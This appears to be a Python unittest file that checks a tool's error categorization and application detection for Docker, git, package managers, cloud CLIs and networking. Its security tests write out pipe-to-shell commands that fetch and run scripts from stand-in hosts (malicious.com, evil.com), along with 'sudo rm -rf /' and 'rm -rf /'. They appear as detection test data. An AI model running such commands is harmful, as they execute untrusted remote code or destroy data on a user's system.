#!/usr/bin/env python3
"""
Scenario-based tests for patch.py
Tests real-world usage scenarios and user workflows
"""

import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from patch import (
    categorize_error_type,
    get_platform_info,
    get_app_info,
    is_pipe_to_shell,
)


class TestDockerScenarios(unittest.TestCase):
    """Test Docker-related scenarios."""

    def test_docker_daemon_not_running_macos(self):
        """Test Docker daemon error on macOS."""
        error = 'daemon not running'
        command = 'docker ps'
        result = categorize_error_type(error, command)
        
        # Should be daemon_not_running type
        self.assertIn('daemon_not_running', result)
        # Should mention macOS
        if get_platform_info() == 'macOS':
            self.assertIn('macOS', result)
            self.assertIn('open', result)
        print(f"[✓] Docker daemon error correctly categorized")

    def test_docker_command_not_found(self):
        """Test Docker command not found (on macOS)."""
        error = 'command not found: docker'
        command = 'docker ps'
        
        # macOS doesn't have systemctl
        platform = get_platform_info()
        result = categorize_error_type(error, command)
        
        self.assertIn('command_syntax', result)
        print(f"[✓] Docker not found error correctly categorized")

    def test_docker_socket_error(self):
        """Test Docker socket connection error."""
        error = 'no such file or directory: /var/run/docker.sock'
        command = 'docker ps'
        result = categorize_error_type(error, command)
        
        self.assertIn('daemon_not_running', result)
        print(f"[✓] Docker socket error correctly categorized")


class TestPackageManagementScenarios(unittest.TestCase):
    """Test package management scenarios."""

    def test_brew_install_success(self):
        """Test Homebrew install command."""
        command = 'brew install python'
        result = get_app_info(command)
        
        self.assertEqual(result, 'Homebrew')
        print(f"[✓] Homebrew command correctly detected")

    def test_apt_command_on_macos(self):
        """Test apt command (Linux package manager) on macOS."""
        error = 'command not found: apt'
        command = 'apt install python3'
        result = categorize_error_type(error, command)
        
        self.assertIn('command_syntax', result)
        app_info = get_app_info(command)
        self.assertEqual(app_info, 'apt (package manager)')
        print(f"[✓] apt command on macOS correctly categorized")

    def test_pip_module_not_found(self):
        """Test pip module not found error."""
        error = 'ModuleNotFoundError: No module named "requests"'
        command = 'python3 -m requests.get'
        result = categorize_error_type(error, command)
        
        self.assertIn('dependency_missing', result)
        print(f"[✓] pip module not found correctly categorized")

    def test_npm_package_not_found(self):
        """Test npm package not found error."""
        error = 'npm ERR! code E404'
        command = 'npm install missing-package'
        result = categorize_error_type(error, command)
        
        app_info = get_app_info(command)
        self.assertEqual(app_info, 'Node.js (npm)')
        print(f"[✓] npm command correctly detected")


class TestVersionControlScenarios(unittest.TestCase):
    """Test version control scenarios."""

    def test_git_permission_denied(self):
        """Test Git permission denied error."""
        error = 'permission denied: git: git'
        command = 'git push origin main'
        result = categorize_error_type(error, command)
        
        self.assertIn('permission_denied', result)
        app_info = get_app_info(command)
        self.assertEqual(app_info, 'Git')
        print(f"[✓] Git permission denied correctly categorized")

    def test_git_command_typo(self):
        """Test Git command with typo."""
        error = 'git: "pushs" is not a git command'
        command = 'git pushs origin main'
        result = categorize_error_type(error, command)
        
        self.assertIn('command_syntax', result)
        print(f"[✓] Git typo correctly categorized")

    def test_git_missing_file(self):
        """Test Git operation on missing file."""
        error = 'file not found: README.md'
        command = 'git add README.md'
        result = categorize_error_type(error, command)
        
        self.assertIn('file_not_found', result)
        print(f"[✓] Git file not found correctly categorized")


class TestSecurityScenarios(unittest.TestCase):
    """Test security-related scenarios."""

    def test_pipe_to_shell_warning(self):
        """Test detection of pipe-to-shell for security."""
        commands = [
            'curl -fsSL http://malicious.com | bash',
            'wget -qO- http://evil.com | sh',
        ]
        
        for cmd in commands:
            self.assertTrue(is_pipe_to_shell(cmd), 
                          f"Failed to detect pipe to shell: {cmd}")
        
        print(f"[✓] Pipe-to-shell security detection works")

    def test_sudo_usage_detection(self):
        """Testsudo usage for security warning."""
        command = 'sudo rm -rf /'
        parts = command.split()
        self.assertEqual(parts[0], 'sudo')
        print(f"[✓] sudo prefix detection works")

    def test_dangerous_command(self):
        """Test dangerous command (rm -rf)."""
        command = 'rm -rf /'
        parts = command.split()
        
        # Should detect 'rm' as the command
        self.assertIn('rm', parts)
        print(f"[✓] Dangerous command parsing works")


class TestCloudServicesScenarios(unittest.TestCase):
    """Test cloud service CLI scenarios."""

    def test_aws_cli_command(self):
        """Test AWS CLI command."""
        command = 'aws s3 ls'
        result = get_app_info(command)
        
        self.assertEqual(result, 'AWS CLI')
        print(f"[✓] AWS CLI command correctly detected")

    def test_gcloud_command(self):
        """Test Google Cloud CLI command."""
        command = 'gcloud compute instances list'
        result = get_app_info(command)
        
        self.assertEqual(result, 'Google Cloud CLI')
        print(f"[✓] Google Cloud CLI command correctly detected")

    def test_azure_cli_command(self):
        """Test Azure CLI command."""
        command = 'az vm list'
        result = get_app_info(command)
        
        self.assertEqual(result, 'Azure CLI')
        print(f"[✓] Azure CLI command correctly detected")


class TestNetworkingScenarios(unittest.TestCase):
    """Test networking-related scenarios."""

    def test_ssh_connection_error(self):
        """Test SSH connection error."""
        error = 'ssh: connect to host port 22: Connection refused'
        command = 'ssh user@host'
        result = categorize_error_type(error, command)
        
        self.assertIn('network_error', result)
        print(f"[✓] SSH connection error correctly categorized")

    def test_dns_resolution_error(self):
        """Test DNS resolution error."""
        error = 'hostname or servname not provided'
        command = 'ping invalid-hostname-12345.invalid'
        result = categorize_error_type(error, command)
        
        self.assertIn('network_error', result)
        print(f"[✓] DNS resolution error correctly categorized")

    def test_curl_timeout(self):
        """Test curl timeout error."""
        error = 'curl: (7) Failed to connect'
        command = 'curl https://example.com'
        result = categorize_error_type(error, command)
        
        self.assertIn('network_error', result)
        print(f"[✓] curl timeout error correctly categorized")


class TestDocumentationScenarios(unittest.TestCase):
    """Test documentation and help scenarios."""

    def test_command_with_help_flag(self):
        """Test command with --help flag."""
        command = 'docker --help'
        parts = command.split()
        self.assertIn('--help', parts)
        print(f"[✓] Help flag detection works")

    def test_command_with_usage(self):
        """Test command with usage message."""
        error = 'Usage: docker [OPTIONS] COMMAND'
        command = 'docker'
        result = categorize_error_type(error, command)
        
        self.assertIn('command_syntax', result)
        print(f"[✓] Usage message correctly categorized")


class TestIntegrationWorkflows(unittest.TestCase):
    """Test complete user workflows."""

    def test_python_to_pip_workflow(self):
        """Test Python to pip installation workflow."""
        # Step 1: Try running Python module that doesn't exist
        error1 = 'ModuleNotFoundError: No module named "dataclasses"'
        command1 = 'python3 -m dataclasses'
        result1 = categorize_error_type(error1, command1)
        self.assertIn('dependency_missing', result1)
        
        # Step 2: Detect it's a pip issue
        app_info = get_app_info('pip install dataclasses')
        self.assertEqual(app_info, 'Python (pip)')
        
        print(f"[✓] Python to pip workflow works")

    def test_docker_compose_workflow(self):
        """Test Docker Compose workflow."""
        # Step 1: Detect Docker Compose
        app_info = get_app_info('docker-compose up -d')
        self.assertEqual(app_info, 'Docker Compose')
        
        # Step 2: Handle configuration error
        error = 'configuration not found: docker-compose.yml'
        result = categorize_error_type(error, 'docker-compose up')
        self.assertIn('configuration', result)
        
        print(f"[✓] Docker Compose workflow works")

    def test_kubernetes_workflow(self):
        """Test Kubernetes workflow."""
        # Step 1: Detect kubectl
        app_info = get_app_info('kubectl get pods')
        self.assertEqual(app_info, 'Kubernetes (kubectl)')
        
        # Step 2: Handle service not found
        error = 'daemon not running'
        result = categorize_error_type(error, 'kubectl get pods')
        # kubectl is Kubernetes but we might categorize differently
        self.assertIn('daemon_not_running', result)
        
        print(f"[✓] Kubernetes workflow works")


def run_scenario_tests():
    """Run all scenario tests."""
    print("\n" + "=" * 60)
    print("   Patch.py Scenario-Based Tests")
    print("=" * 60 + "\n")

    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    suite.addTests(loader.loadTestsFromTestCase(TestDockerScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestPackageManagementScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestVersionControlScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestCloudServicesScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestNetworkingScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestDocumentationScenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegrationWorkflows))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print("\n" + "=" * 60)
    print("   Scenario Test Summary")
    print("=" * 60)
    print(f"Tests run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print("=" * 60 + "\n")

    return result.wasSuccessful()


if __name__ == '__main__':
    success = run_scenario_tests()
    sys.exit(0 if success else 1)